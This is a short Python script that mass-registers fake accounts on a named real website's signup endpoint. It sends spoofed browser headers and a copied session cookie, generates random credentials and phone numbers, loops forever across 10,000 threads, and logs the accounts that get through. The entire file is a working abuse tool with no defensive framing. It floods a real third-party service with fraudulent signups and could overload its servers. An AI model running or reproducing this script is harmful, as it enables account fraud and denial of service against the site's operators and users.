import requests,random,string,threading
def main():
  headers = {
      'authority': 'sub247.online',
      'sec-ch-ua': '"Google Chrome";v="95", "Chromium";v="95", ";Not A Brand";v="99"',
      'accept': 'application/json, text/javascript, */*; q=0.01',
      'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
      'x-requested-with': 'XMLHttpRequest',
      'sec-ch-ua-mobile': '?0',
      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36',
      'sec-ch-ua-platform': '"Windows"',
      'origin': 'https://sub247.online',
      'sec-fetch-site': 'same-origin',
      'sec-fetch-mode': 'cors',
      'sec-fetch-dest': 'empty',
      'referer': 'https://sub247.online/dang-ky',
      'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
      'cookie': 'PHPSESSID=6c66b17cb8ca0ffe9af7f04e83102f23; __cf_bm=M_CdK3HFU6aLxTVVfhw3JB2j2LNssuk_rVkb0LM55Xk-1635264639-0-AevUOkmf1K4lHUaSb1ACyGuVb71Njf5PQaSZ/JgSGy2CXVaOpKt9/1hUbvPVxSRwm6QIQolh1qUkH25aRh4dwYj8MZzFaoHhDPC9I/kQ2P6wYZBKG9RYB/ZP+Rn0rKNikQ==',
  }

  while True:
    st = ''.join((random.choice(string.ascii_lowercase) for x in range(20)))
    sdt = random.randint(1000000000,99999999999)
    data = {
    'username': st,
    'password': st,
    'fullname': 'Mark Zuckerberg',
    'email': f'{st}@gmail.com',
    'phone': sdt,
    'remember': 'on'
  }
    response = requests.post('https://sub247.online/xuly/sinup.php', headers=headers, data=data)
    if "success" in response.text:
      out = f"{st}|{st}@gmail.com|{st}|{sdt}"
      open("acc.txt","a+").write(f'{out}\n')
      print(out)
    else:
      open('a.html','w').write(response.text)
for i in range(10000):
  new_thread = threading.Thread(target=main, args=()).start()